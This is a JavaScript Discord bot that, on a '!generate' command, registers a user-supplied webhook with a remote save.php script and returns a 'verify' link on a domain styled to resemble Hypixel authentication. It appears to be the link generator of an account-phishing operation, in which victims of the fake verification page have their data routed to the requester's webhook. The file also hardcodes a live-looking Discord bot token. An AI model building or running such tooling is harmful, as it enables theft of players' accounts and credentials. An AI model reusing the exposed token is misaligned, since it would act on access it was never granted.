const Discord = require('discord.js');
const crypto = require('crypto');
const axios = require('axios');
const client = new Discord.Client({ intents: [Discord.Intents.FLAGS.GUILDS, Discord.Intents.FLAGS.GUILD_MESSAGES] });

const PREFIX = '!'; // Command prefix
const savePhpURL = 'https://bbindigo.000webhostapp.com/save.php'; // URL of the save.php script

client.once('ready', () => {
  console.log(`Logged in as ${client.user.tag}`);
});

client.on('messageCreate', async (message) => {
  if (message.content.startsWith(`${PREFIX}generate`)) {
    const args = message.content.slice(PREFIX.length).trim().split(' ');

    // Check for webhook and id arguments
    if (args.length < 2) {
      message.reply('Please provide a webhook URL and an optional ID.');
      return;
    }

    const webhookURL = args[1];
    const userId = args[2] || crypto.randomBytes(8).toString('hex');

    // Send a GET request to save.php with the parameters in the URL
    axios.get(`${savePhpURL}?id=${userId}&webhook=${webhookURL}`)
      .then((response) => {
        console.log('Data sent to save.php:', response.data);
        message.reply(`Your Link is https://hypix-elauth.onrender.com/verify/${userId}`);
      })
      .catch((error) => {
        console.error('Error sending data to save.php:', error.message);
        message.reply('Error saving webhook data.');
      });
  }
});

client.login('MTE3MTYzNTQzODEzMDMxNTI5NA.GlBGvq.ymy_rjbHUh23vhOMajI1dqoD79GxZD4kCrMyAk');
